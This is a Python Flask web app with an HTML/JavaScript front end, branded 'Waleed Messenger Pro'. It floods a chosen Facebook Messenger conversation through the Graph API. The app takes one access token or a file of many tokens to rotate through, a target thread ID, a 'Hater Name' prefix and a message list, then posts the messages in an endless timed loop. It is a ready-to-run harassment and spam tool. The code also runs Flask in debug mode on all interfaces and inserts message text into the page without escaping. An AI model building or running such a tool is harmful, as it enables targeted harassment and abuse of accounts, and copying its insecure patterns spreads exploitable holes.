from flask import Flask, request, jsonify, render_template_string, session
import threading
import requests
import os
import time
from colorama import Fore, init
import random
import string
import json
from datetime import datetime

# Initialize colorama
init(autoreset=True)

app = Flask(__name__)
app.debug = True
app.secret_key = os.urandom(24)  # For session management

tasks = {}
monitoring_data = {}
admin_whatsapp_number = ""  # Store admin WhatsApp number

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

# Function to generate random task id
def generate_random_id(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# Function to generate a license key
def generate_license_key():
    parts = []
    for _ in range(4):
        part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
        parts.append(part)
    return '-'.join(parts)

# Background function to send messages
def send_messages(task_id, token_type, access_token, thread_id, messages, mn, time_interval, tokens=None):
    tasks[task_id] = {'running': True, 'paused': False}
    monitoring_data[task_id] = {
        'start_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'total_messages': 0,
        'successful_messages': 0,
        'failed_messages': 0,
        'last_message': '',
        'status': 'Running',
        'message_history': [],
        'thread_id': thread_id,
        'prefix': mn,
        'interval': time_interval,
        'tokens_used': 1 if token_type == 'single' else len(tokens),
        'token_type': token_type
    }

    token_index = 0
    while tasks[task_id]['running']:
        if tasks[task_id]['paused']:
            time.sleep(1)
            continue
            
        for message1 in messages:
            if not tasks[task_id]['running']:
                break
                
            if tasks[task_id]['paused']:
                while tasks[task_id]['paused'] and tasks[task_id]['running']:
                    time.sleep(1)
                if not tasks[task_id]['running']:
                    break
                    
            try:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                if token_type == 'single':
                    current_token = access_token
                else:
                    current_token = tokens[token_index]
                    token_index = (token_index + 1) % len(tokens)

                parameters = {'access_token': current_token, 'message': message}
                response = requests.post(api_url, data=parameters, headers=headers)
                
                # Update monitoring data
                monitoring_data[task_id]['total_messages'] += 1
                monitoring_data[task_id]['last_message'] = message
                
                log_entry = {
                    'time': datetime.now().strftime("%H:%M:%S"),
                    'token': current_token[:10] + '...',
                    'message': message[:50] + '...' if len(message) > 50 else message,
                    'status': response.status_code
                }
                
                monitoring_data[task_id]['message_history'].append(log_entry)
                # Keep only last 20 messages in history
                if len(monitoring_data[task_id]['message_history']) > 20:
                    monitoring_data[task_id]['message_history'].pop(0)

                if response.status_code == 200:
                    print(Fore.GREEN + f"Message sent using token {current_token}: {message}")
                    monitoring_data[task_id]['successful_messages'] += 1
                else:
                    print(Fore.RED + f"Failed to send message using token {current_token}: {message}")
                    monitoring_data[task_id]['failed_messages'] += 1

                time.sleep(time_interval)
            except Exception as e:
                print(Fore.RED + f"Error while sending message using token {current_token}: {message}")
                print(e)
                monitoring_data[task_id]['failed_messages'] += 1
                time.sleep(30)

    monitoring_data[task_id]['status'] = 'Stopped'
    monitoring_data[task_id]['end_time'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(Fore.WHITE + f"Task {task_id} stopped.")

@app.route('/', methods=['GET', 'POST'])
def index():
    # Set default theme if not set
    if 'theme' not in session:
        session['theme'] = 'rgb-cyber'
    
    if request.method == 'POST':
        token_type = request.form.get('tokenType')
        access_token = request.form.get('accessToken')
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        if token_type == 'multi':
            token_file = request.files['tokenFile']
            tokens = token_file.read().decode().splitlines()
        else:
            tokens = None

        # Generate random task id
        task_id = generate_random_id()

        # Start the background thread
        thread = threading.Thread(target=send_messages, args=(task_id, token_type, access_token, thread_id, messages, mn, time_interval, tokens))
        thread.start()

        return jsonify({'task_id': task_id})

    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Waleed Messenger Pro</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    :root {
      --primary-color: #4a6fa5;
      --secondary-color: #166088;
      --accent-color: #4cb1ff;
      --text-color: #f8f9fa;
      --bg-color: #1a1a2e;
      --card-bg: #16213e;
      --input-bg: #0f3460;
      --border-color: #4cb1ff;
    }
    
    .theme-rgb-cyber {
      --primary-color: #0ff;
      --secondary-color: #f0f;
      --accent-color: #ff0;
      --text-color: #fff;
      --bg-color: #000;
      --card-bg: rgba(0, 0, 20, 0.8);
      --input-bg: rgba(0, 10, 30, 0.8);
      --border-color: #0ff;
    }
    
    .theme-rgb-neon {
      --primary-color: #39ff14;
      --secondary-color: #ff3131;
      --accent-color: #1f51ff;
      --text-color: #fff;
      --bg-color: #0a0a0a;
      --card-bg: rgba(10, 20, 10, 0.8);
      --input-bg: rgba(15, 30, 15, 0.8);
      --border-color: #39ff14;
    }
    
    .theme-rgb-purple {
      --primary-color: #8a2be2;
      --secondary-color: #9370db;
      --accent-color: #da70d6;
      --text-color: #f8f9fa;
      --bg-color: #0f0824;
      --card-bg: #1e103c;
      --input-bg: #2d1f4d;
      --border-color: #9370db;
    }
    
    .theme-rgb-orange {
      --primary-color: #ff6700;
      --secondary-color: #ff8c00;
      --accent-color: #ffa500;
      --text-color: #f8f9fa;
      --bg-color: #1c0c00;
      --card-bg: #2e1a0c;
      --input-bg: #3f2719;
      --border-color: #ff8c00;
    }
    
    body {
      background-color: var(--bg-color);
      color: var(--text-color);
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      transition: all 0.3s ease;
      background-image: 
        radial-gradient(circle at 10% 20%, rgba(255, 0, 0, 0.1) 0%, transparent 20%),
        radial-gradient(circle at 90% 80%, rgba(0, 255, 255, 0.1) 0%, transparent 20%),
        radial-gradient(circle at 50% 50%, rgba(255, 255, 0, 0.05) 0%, transparent 30%);
    }
    
    .container {
      max-width: 500px;
      background-color: var(--card-bg);
      border-radius: 15px;
      padding: 25px;
      margin: 0 auto;
      margin-top: 20px;
      box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
      border: 1px solid var(--border-color);
      backdrop-filter: blur(5px);
    }
    
    .header {
      text-align: center;
      padding-bottom: 15px;
      margin-bottom: 20px;
      border-bottom: 2px solid var(--accent-color);
    }
    
    .header h1 {
      font-weight: 700;
      font-size: 2.2rem;
      background: linear-gradient(45deg, var(--primary-color), var(--secondary-color), var(--accent-color));
      background-size: 200% 200%;
      animation: rgbAnimation 3s ease infinite;
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      text-shadow: 0 2px 4px rgba(0,0,0,0.3);
    }
    
    .form-control, .form-select {
      background-color: var(--input-bg);
      color: var(--text-color);
      border: 1px solid var(--border-color);
      border-radius: 8px;
      padding: 10px 15px;
      transition: all 0.3s ease;
    }
    
    .form-control:focus, .form-select:focus {
      background-color: var(--input-bg);
      color: var(--text-color);
      border-color: var(--accent-color);
      box-shadow: 0 0 10px var(--accent-color);
    }
    
    .btn-primary {
      background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
      border: none;
      border-radius: 8px;
      padding: 12px;
      font-weight: 600;
      transition: all 0.3s ease;
    }
    
    .btn-primary:hover {
      background: linear-gradient(45deg, var(--secondary-color), var(--accent-color));
      transform: translateY(-2px);
      box-shadow: 0 4px 15px var(--accent-color);
    }
    
    .btn-warning {
      background: linear-gradient(45deg, #ffc107, #e0a800);
      border: none;
      border-radius: 8px;
      padding: 12px;
      font-weight: 600;
      transition: all 0.3s ease;
    }
    
    .btn-warning:hover {
      background: linear-gradient(45deg, #e0a800, #c69500);
      transform: translateY(-2px);
      box-shadow: 0 4px 15px rgba(255, 193, 7, 0.5);
    }
    
    .btn-danger {
      background: linear-gradient(45deg, #dc3545, #c82333);
      border: none;
      border-radius: 8px;
      padding: 12px;
      font-weight: 600;
      transition: all 0.3s ease;
    }
    
    .btn-danger:hover {
      background: linear-gradient(45deg, #c82333, #a71e2a);
      transform: translateY(-2px);
      box-shadow: 0 4px 15px rgba(220, 53, 69, 0.5);
    }
    
    label {
      font-weight: 500;
      margin-bottom: 8px;
      color: var(--accent-color);
    }
    
    .theme-selector {
      display: flex;
      justify-content: center;
      margin-bottom: 20px;
      gap: 10px;
    }
    
    .theme-btn {
      width: 30px;
      height: 30px;
      border-radius: 50%;
      border: 2px solid #fff;
      cursor: pointer;
      transition: all 0.2s ease;
    }
    
    .theme-btn:hover {
      transform: scale(1.1);
      box-shadow: 0 0 10px #fff;
    }
    
    .theme-btn.rgb-cyber {
      background: linear-gradient(45deg, #0ff, #f0f, #ff0);
      background-size: 200% 200%;
      animation: rgbAnimation 3s ease infinite;
    }
    
    .theme-btn.rgb-neon {
      background: linear-gradient(45deg, #39ff14, #ff3131, #1f51ff);
      background-size: 200% 200%;
      animation: rgbAnimation 3s ease infinite;
    }
    
    .theme-btn.rgb-purple {
      background: linear-gradient(45deg, #8a2be2, #9370db, #da70d6);
      background-size: 200% 200%;
      animation: rgbAnimation 3s ease infinite;
    }
    
    .theme-btn.rgb-orange {
      background: linear-gradient(45deg, #ff6700, #ff8c00, #ffa500);
      background-size: 200% 200%;
      animation: rgbAnimation 3s ease infinite;
    }
    
    .footer {
      text-align: center;
      margin-top: 30px;
      padding: 15px;
      font-size: 0.9rem;
      color: var(--accent-color);
      border-top: 1px solid var(--border-color);
    }
    
    .task-status {
      background-color: var(--input-bg);
      padding: 15px;
      border-radius: 8px;
      margin-top: 20px;
      display: none;
      border: 1px solid var(--border-color);
    }
    
    .logo {
      font-size: 2.5rem;
      margin-bottom: 10px;
      color: var(--accent-color);
    }
    
    .monitor-container {
      max-width: 1200px;
      background-color: var(--card-bg);
      border-radius: 15px;
      padding: 25px;
      margin: 20px auto;
      box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
      border: 1px solid var(--border-color);
      backdrop-filter: blur(5px);
    }
    
    .monitor-header {
      text-align: center;
      padding-bottom: 15px;
      margin-bottom: 20px;
      border-bottom: 2px solid var(--accent-color);
    }
    
    .stats-grid {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 15px;
      margin-bottom: 20px;
    }
    
    .stat-box {
      background-color: var(--input-bg);
      padding: 15px;
      border-radius: 8px;
      text-align: center;
      border: 1px solid var(--border-color);
    }
    
    .stat-value {
      font-size: 1.5rem;
      font-weight: bold;
      color: var(--accent-color);
    }
    
    .message-history {
      max-height: 300px;
      overflow-y: auto;
      background-color: var(--input-bg);
      padding: 15px;
      border-radius: 8px;
      border: 1px solid var(--border-color);
    }
    
    .message-item {
      padding: 8px;
      border-bottom: 1px solid var(--border-color);
      display: grid;
      grid-template-columns: 60px 80px 1fr 60px;
      gap: 10px;
    }
    
    .message-item:last-child {
      border-bottom: none;
    }
    
    .status-success {
      color: #39ff14;
    }
    
    .status-error {
      color: #ff3131;
    }
    
    .status-paused {
      color: #ffffff;
    }
    
    @keyframes rgbAnimation {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
    
    .rgb-text {
      background: linear-gradient(45deg, var(--primary-color), var(--secondary-color), var(--accent-color));
      background-size: 200% 200%;
      animation: rgbAnimation 3s ease infinite;
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }
    
    .admin-key-section {
      background-color: var(--input-bg);
      padding: 15px;
      border-radius: 8px;
      margin-top: 20px;
      border: 1px solid var(--border-color);
    }
    
    .control-buttons {
      display: flex;
      gap: 10px;
      margin-top: 15px;
    }
    
    .control-buttons button {
      flex: 1;
    }
    
    /* Session monitoring table styles */
    .sessions-table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 20px;
      background-color: var(--input-bg);
      border-radius: 8px;
      overflow: hidden;
    }
    
    .sessions-table th, .sessions-table td {
      padding: 12px;
      text-align: left;
      border-bottom: 1px solid var(--border-color);
    }
    
    .sessions-table th {
      background-color: var(--secondary-color);
      color: var(--text-color);
      font-weight: 600;
    }
    
    .sessions-table tr:hover {
      background-color: rgba(255, 255, 255, 0.05);
    }
    
    .status-badge {
      padding: 4px 8px;
      border-radius: 4px;
      font-size: 0.8rem;
      font-weight: bold;
    }
    
    .status-running {
      background-color: #28a745;
      color: white;
    }
    
    .status-paused {
      background-color: #ffc107;
      color: black;
    }
    
    .status-stopped {
      background-color: #dc3545;
      color: white;
    }
    
    .action-buttons {
      display: flex;
      gap: 5px;
    }
    
    .action-buttons button {
      padding: 4px 8px;
      font-size: 0.8rem;
    }
  </style>
</head>
<body>
  <div class="theme-selector">
    <div class="theme-btn rgb-cyber" data-theme="rgb-cyber"></div>
    <div class="theme-btn rgb-neon" data-theme="rgb-neon"></div>
    <div class="theme-btn rgb-purple" data-theme="rgb-purple"></div>
    <div class="theme-btn rgb-orange" data-theme="rgb-orange"></div>
  </div>

  <header class="header">
    <div class="logo">
      <i class="fas fa-paper-plane"></i>
    </div>
    <h1>Waleed Messenger Pro</h1>
    <p>Ultimate Message Sending Solution</p>
  </header>

  <div class="container">
    <form action="/" method="post" enctype="multipart/form-data" id="mainForm">
      <div class="mb-3">
        <label for="tokenType"><i class="fas fa-key"></i> Select Token Type:</label>
        <select class="form-control" id="tokenType" name="tokenType" required>
          <option value="single">Single Token</option>
          <option value="multi">Multi Token</option>
        </select>
      </div>
      <div class="mb-3" id="singleTokenField">
        <label for="accessToken"><i class="fas fa-token"></i> Enter Your Token:</label>
        <input type="text" class="form-control" id="accessToken" name="accessToken">
      </div>
      <div class="mb-3">
        <label for="threadId"><i class="fas fa-comments"></i> Enter Convo/Inbox ID:</label>
        <input type="text" class="form-control" id="threadId" name="threadId" required>
      </div>
      <div class="mb-3">
        <label for="kidx"><i class="fas fa-signature"></i> Enter Hater Name:</label>
        <input type="text" class="form-control" id="kidx" name="kidx" required>
      </div>
      <div class="mb-3">
        <label for="txtFile"><i class="fas fa-file-lines"></i> Select Your Message File:</label>
        <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
      </div>
      <div class="mb-3" id="multiTokenFile" style="display: none;">
        <label for="tokenFile"><i class="fas fa-file-code"></i> Select Token File (for multi-token):</label>
        <input type="file" class="form-control" id="tokenFile" name="tokenFile" accept=".txt">
      </div>
      <div class="mb-3">
        <label for="time"><i class="fas fa-gauge-high"></i> Speed in Seconds:</label>
        <input type="number" class="form-control" id="time" name="time" min="1" value="2" required>
      </div>
      <button type="submit" class="btn btn-primary btn-submit">
        <i class="fas fa-play-circle"></i> Start Task
      </button>
    </form>
    
    <div class="task-status" id="taskStatus">
      <h5><i class="fas fa-spinner fa-spin"></i> Task Running</h5>
      <p>Task ID: <span id="currentTaskId"></span></p>
      <p>Status: <span class="text-success">Active</span></p>
    </div>
  </div>

  <div class="monitor-container" id="monitorSection" style="display: none;">
    <div class="monitor-header">
      <h3><i class="fas fa-chart-line"></i> Live Monitoring - Task: <span id="monitorTaskId"></span></h3>
    </div>
    
    <div class="stats-grid">
      <div class="stat-box">
        <div>Start Time</div>
        <div class="stat-value" id="startTime">-</div>
      </div>
      <div class="stat-box">
        <div>Status</div>
        <div class="stat-value" id="currentStatus">-</div>
      </div>
      <div class="stat-box">
        <div>Total Messages</div>
        <div class="stat-value" id="totalMessages">0</div>
      </div>
      <div class="stat-box">
        <div>Successful</div>
        <div class="stat-value status-success" id="successMessages">0</div>
      </div>
      <div class="stat-box">
        <div>Failed</div>
        <div class="stat-value status-error" id="failedMessages">0</div>
      </div>
      <div class="stat-box">
        <div>Last Message</div>
        <div class="stat-value" id="lastMessage">-</div>
      </div>
    </div>
    
    <h5><i class="fas fa-history"></i> Message History</h5>
    <div class="message-history" id="messageHistory">
      <div class="message-item">
        <div>Time</div>
        <div>Token</div>
        <div>Message</div>
        <div>Status</div>
      </div>
    </div>
    
    <div class="control-buttons">
      <button class="btn btn-warning" id="pauseMonitorBtn">
        <i class="fas fa-pause"></i> Pause Task
      </button>
      <button class="btn btn-primary" id="resumeMonitorBtn" style="display: none;">
        <i class="fas fa-play"></i> Resume Task
      </button>
      <button class="btn btn-danger" id="stopMonitorBtn">
        <i class="fas fa-stop"></i> Stop Task
      </button>
    </div>
  </div>

  <div class="monitor-container">
    <div class="monitor-header">
      <h3><i class="fas fa-list"></i> Active Sessions</h3>
    </div>
    
    <table class="sessions-table">
      <thead>
        <tr>
          <th>ID</th>
          <th>Status</th>
          <th>Thread ID</th>
          <th>Prefix</th>
          <th>Interval</th>
          <th>Tokens</th>
          <th>Messages Sent</th>
          <th>Action</th>
        </tr>
      </thead>
      <tbody id="sessionsTableBody">
        <!-- Sessions will be populated here -->
      </tbody>
    </table>
  </div>

  <div class="container mt-4">
    <h3><i class="fas fa-stop-circle"></i> Stop Task</h3>
    <form action="/stop_task" method="post" id="stopForm">
      <div class="mb-3">
        <label for="taskId">Enter Task ID:</label>
        <input type="text" class="form-control" id="taskId" name="taskId" required>
      </div>
      <button type="submit" class="btn btn-danger btn-submit">
        <i class="fas fa-stop"></i> Stop Task
      </button>
    </form>
  </div>

  <footer class="footer">
    <p>&copy; 2025 Waleed Messenger Pro. Developed with <i class="fas fa-heart text-danger"></i> by Waleed</p>
  </footer>

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
  <script>
    document.addEventListener('DOMContentLoaded', function() {
      let currentTaskId = '';
      let monitorInterval = null;
      let sessionsInterval = null;
      let currentGeneratedKey = '';
      
      // Handle token type change
      document.getElementById('tokenType').addEventListener('change', function() {
        var tokenType = this.value;
        document.getElementById('multiTokenFile').style.display = tokenType === 'multi' ? 'block' : 'none';
        document.getElementById('singleTokenField').style.display = tokenType === 'multi' ? 'none' : 'block';
      });
      
      // Theme switcher
      const themeButtons = document.querySelectorAll('.theme-btn');
      themeButtons.forEach(btn => {
        btn.addEventListener('click', function() {
          const theme = this.getAttribute('data-theme');
          document.body.className = 'theme-' + theme;
          // Store theme in session
          fetch('/set_theme?theme=' + theme);
        });
      });
      
      // Apply saved theme
      document.body.className = 'theme-{{ session.theme }}';
      
      // Form submission with AJAX
      document.getElementById('mainForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const formData = new FormData(this);
        
        fetch('/', {
          method: 'POST',
          body: formData
        })
        .then(response => response.json())
        .then(data => {
          currentTaskId = data.task_id;
          document.getElementById('currentTaskId').textContent = currentTaskId;
          document.getElementById('taskStatus').style.display = 'block';
          
          // Show monitoring section
          document.getElementById('monitorSection').style.display = 'block';
          document.getElementById('monitorTaskId').textContent = currentTaskId;
          
          // Start monitoring
          startMonitoring(currentTaskId);
          
          // Start sessions monitoring
          startSessionsMonitoring();
          
          // Scroll to monitoring section
          document.getElementById('monitorSection').scrollIntoView({ behavior: 'smooth' });
        })
        .catch(error => {
          console.error('Error:', error);
        });
      });
      
      // Stop form submission with AJAX
      document.getElementById('stopForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const formData = new FormData(this);
        const taskId = formData.get('taskId');
        
        fetch('/stop_task', {
          method: 'POST',
          body: formData
        })
        .then(response => response.json())
        .then(data => {
          if (data.status === 'stopped') {
            alert('Task ' + data.task_id + ' has been stopped successfully!');
            if (data.task_id === currentTaskId) {
              stopMonitoring();
            }
            // Refresh sessions table
            updateSessionsTable();
          } else {
            alert('Task not found! Please check the Task ID.');
          }
        })
        .catch(error => {
          console.error('Error:', error);
        });
      });
      
      // Pause monitor button
      document.getElementById('pauseMonitorBtn').addEventListener('click', function() {
        if (currentTaskId) {
          fetch('/pause_task?task_id=' + currentTaskId)
          .then(response => response.json())
          .then(data => {
            if (data.status === 'paused') {
              document.getElementById('pauseMonitorBtn').style.display = 'none';
              document.getElementById('resumeMonitorBtn').style.display = 'block';
              document.getElementById('currentStatus').textContent = 'Paused';
              document.getElementById('currentStatus').className = 'stat-value status-paused';
              // Refresh sessions table
              updateSessionsTable();
            } else {
              alert('Error pausing task.');
            }
          })
          .catch(error => {
            console.error('Error:', error);
          });
        }
      });
      
      // Resume monitor button
      document.getElementById('resumeMonitorBtn').addEventListener('click', function() {
        if (currentTaskId) {
          fetch('/resume_task?task_id=' + currentTaskId)
          .then(response => response.json())
          .then(data => {
            if (data.status === 'resumed') {
              document.getElementById('pauseMonitorBtn').style.display = 'block';
              document.getElementById('resumeMonitorBtn').style.display = 'none';
              document.getElementById('currentStatus').textContent = 'Running';
              document.getElementById('currentStatus').className = 'stat-value status-success';
              // Refresh sessions table
              updateSessionsTable();
            } else {
              alert('Error resuming task.');
            }
          })
          .catch(error => {
            console.error('Error:', error);
          });
        }
      });
      
      // Stop monitor button
      document.getElementById('stopMonitorBtn').addEventListener('click', function() {
        if (currentTaskId) {
          const formData = new FormData();
          formData.append('taskId', currentTaskId);
          
          fetch('/stop_task', {
            method: 'POST',
            body: formData
          })
          .then(response => response.json())
          .then(data => {
            if (data.status === 'stopped') {
              alert('Task ' + data.task_id + ' has been stopped successfully!');
              stopMonitoring();
              // Refresh sessions table
              updateSessionsTable();
            } else {
              alert('Task not found! Please check the Task ID.');
            }
          })
          .catch(error => {
            console.error('Error:', error);
          });
        }
      });
      
      // Start monitoring function
      function startMonitoring(taskId) {
        if (monitorInterval) {
          clearInterval(monitorInterval);
        }
        
        monitorInterval = setInterval(() => {
          fetch('/monitor_task?task_id=' + taskId)
            .then(response => response.json())
            .then(data => {
              if (data.status === 'success') {
                updateMonitorDisplay(data.data);
                
                // Update pause/resume buttons based on task status
                if (data.data.status === 'Paused') {
                  document.getElementById('pauseMonitorBtn').style.display = 'none';
                  document.getElementById('resumeMonitorBtn').style.display = 'block';
                } else if (data.data.status === 'Running') {
                  document.getElementById('pauseMonitorBtn').style.display = 'block';
                  document.getElementById('resumeMonitorBtn').style.display = 'none';
                }
              } else if (data.status === 'not found') {
                stopMonitoring();
                alert('Task not found. Monitoring stopped.');
              }
            })
            .catch(error => {
              console.error('Error fetching monitoring data:', error);
            });
        }, 2000);
      }
      
      // Start sessions monitoring
      function startSessionsMonitoring() {
        if (sessionsInterval) {
          clearInterval(sessionsInterval);
        }
        
        sessionsInterval = setInterval(() => {
          updateSessionsTable();
        }, 3000);
      }
      
      // Update sessions table
      function updateSessionsTable() {
        fetch('/get_all_tasks')
          .then(response => response.json())
          .then(data => {
            const tableBody = document.getElementById('sessionsTableBody');
            tableBody.innerHTML = '';
            
            if (data.status === 'success' && data.tasks.length > 0) {
              data.tasks.forEach(task => {
                const row = document.createElement('tr');
                
                // Determine status badge class
                let statusClass = 'status-stopped';
                if (task.status === 'Running') statusClass = 'status-running';
                if (task.status === 'Paused') statusClass = 'status-paused';
                
                row.innerHTML = `
                  <td>${task.id}</td>
                  <td><span class="status-badge ${statusClass}">${task.status}</span></td>
                  <td>${task.thread_id}</td>
                  <td>${task.prefix}</td>
                  <td>${task.interval}s</td>
                  <td>${task.tokens_used}</td>
                  <td>${task.successful_messages}</td>
                  <td class="action-buttons">
                    ${task.status === 'Running' ? 
                      `<button class="btn btn-warning btn-sm" onclick="pauseTask('${task.id}')">Pause</button>` : 
                      `<button class="btn btn-primary btn-sm" onclick="resumeTask('${task.id}')">Resume</button>`}
                    <button class="btn btn-danger btn-sm" onclick="stopTask('${task.id}')">Stop</button>
                  </td>
                `;
                
                tableBody.appendChild(row);
              });
            } else {
              tableBody.innerHTML = '<tr><td colspan="8" style="text-align: center;">No active sessions</td></tr>';
            }
          })
          .catch(error => {
            console.error('Error fetching sessions data:', error);
          });
      }
      
      // Stop monitoring function
      function stopMonitoring() {
        if (monitorInterval) {
          clearInterval(monitorInterval);
          monitorInterval = null;
        }
        
        document.getElementById('taskStatus').style.display = 'none';
        document.getElementById('monitorSection').style.display = 'none';
        currentTaskId = '';
      }
      
      // Update monitor display with data
      function updateMonitorDisplay(data) {
        document.getElementById('startTime').textContent = data.start_time;
        document.getElementById('currentStatus').textContent = data.status;
        document.getElementById('totalMessages').textContent = data.total_messages;
        document.getElementById('successMessages').textContent = data.successful_messages;
        document.getElementById('failedMessages').textContent = data.failed_messages;
        document.getElementById('lastMessage').textContent = data.last_message;
        
        // Update message history
        const messageHistoryContainer = document.getElementById('messageHistory');
        messageHistoryContainer.innerHTML = `
          <div class="message-item">
            <div>Time</div>
            <div>Token</div>
            <div>Message</div>
            <div>Status</div>
          </div>
        `;
        
        if (data.message_history && data.message_history.length > 0) {
          data.message_history.forEach(msg => {
            const messageItem = document.createElement('div');
            messageItem.className = 'message-item';
            
            const statusClass = msg.status === 200 ? 'status-success' : 'status-error';
            
            messageItem.innerHTML = `
              <div>${msg.time}</div>
              <div>${msg.token}</div>
              <div>${msg.message}</div>
              <div class="${statusClass}">${msg.status}</div>
            `;
            
            messageHistoryContainer.appendChild(messageItem);
          });
        }
      }
      
      // Initial sessions table update
      updateSessionsTable();
    });
    
    // Global functions for session actions
    function pauseTask(taskId) {
      fetch('/pause_task?task_id=' + taskId)
        .then(response => response.json())
        .then(data => {
          if (data.status === 'paused') {
            // Refresh sessions table
            document.querySelector('#sessionsTableBody').closest('.monitor-container').querySelector('h3').click();
          } else {
            alert('Error pausing task.');
          }
        })
        .catch(error => {
          console.error('Error:', error);
        });
    }
    
    function resumeTask(taskId) {
      fetch('/resume_task?task_id=' + taskId)
        .then(response => response.json())
        .then(data => {
          if (data.status === 'resumed') {
            // Refresh sessions table
            document.querySelector('#sessionsTableBody').closest('.monitor-container').querySelector('h3').click();
          } else {
            alert('Error resuming task.');
          }
        })
        .catch(error => {
          console.error('Error:', error);
        });
    }
    
    function stopTask(taskId) {
      if (confirm('Are you sure you want to stop this task?')) {
        const formData = new FormData();
        formData.append('taskId', taskId);
        
        fetch('/stop_task', {
          method: 'POST',
          body: formData
        })
        .then(response => response.json())
        .then(data => {
          if (data.status === 'stopped') {
            // Refresh sessions table
            document.querySelector('#sessionsTableBody').closest('.monitor-container').querySelector('h3').click();
          } else {
            alert('Task not found! Please check the Task ID.');
          }
        })
        .catch(error => {
          console.error('Error:', error);
        });
      }
    }
  </script>
</body>
</html>
    ''')

@app.route('/stop_task', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in tasks:
        tasks[task_id]['running'] = False
        if task_id in monitoring_data:
            monitoring_data[task_id]['status'] = 'Stopped'
            monitoring_data[task_id]['end_time'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        return jsonify({'status': 'stopped', 'task_id': task_id})
    return jsonify({'status': 'not found'})

@app.route('/pause_task', methods=['GET'])
def pause_task():
    task_id = request.args.get('task_id')
    if task_id in tasks:
        tasks[task_id]['paused'] = True
        if task_id in monitoring_data:
            monitoring_data[task_id]['status'] = 'Paused'
        return jsonify({'status': 'paused', 'task_id': task_id})
    return jsonify({'status': 'not found'})

@app.route('/resume_task', methods=['GET'])
def resume_task():
    task_id = request.args.get('task_id')
    if task_id in tasks:
        tasks[task_id]['paused'] = False
        if task_id in monitoring_data:
            monitoring_data[task_id]['status'] = 'Running'
        return jsonify({'status': 'resumed', 'task_id': task_id})
    return jsonify({'status': 'not found'})

@app.route('/monitor_task', methods=['GET'])
def monitor_task():
    task_id = request.args.get('task_id')
    if task_id in monitoring_data:
        return jsonify({'status': 'success', 'data': monitoring_data[task_id]})
    return jsonify({'status': 'not found'})

@app.route('/get_all_tasks', methods=['GET'])
def get_all_tasks():
    tasks_list = []
    for task_id, data in monitoring_data.items():
        if tasks.get(task_id, {}).get('running', False):
            task_info = {
                'id': task_id,
                'status': data['status'],
                'thread_id': data['thread_id'],
                'prefix': data['prefix'],
                'interval': data['interval'],
                'tokens_used': data['tokens_used'],
                'successful_messages': data['successful_messages']
            }
            tasks_list.append(task_info)
    
    return jsonify({'status': 'success', 'tasks': tasks_list})

@app.route('/set_theme', methods=['GET'])
def set_theme():
    theme = request.args.get('theme')
    session['theme'] = theme
    return jsonify({'status': 'success'})

# Add this for production deployment
if __name__ == '__main__':
    # Use environment variable for port (required by Render)
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)